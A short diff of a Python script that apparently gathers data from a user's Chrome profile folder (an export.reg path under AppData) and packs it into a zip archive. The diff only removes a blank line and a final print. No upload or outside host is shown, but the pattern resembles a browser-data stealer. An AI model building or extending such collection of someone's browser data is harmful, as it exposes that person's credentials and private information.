@@ -1,4 +1,3 @@
-
 from os import system, path, environ, walk
 from zipfile import ZipFile, ZIP_DEFLATED
 Path = "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\export.reg"
@@ -29,4 +28,4 @@ def createzip():
 
 getData()
 zipData = createzip()
-print(zipData)
+
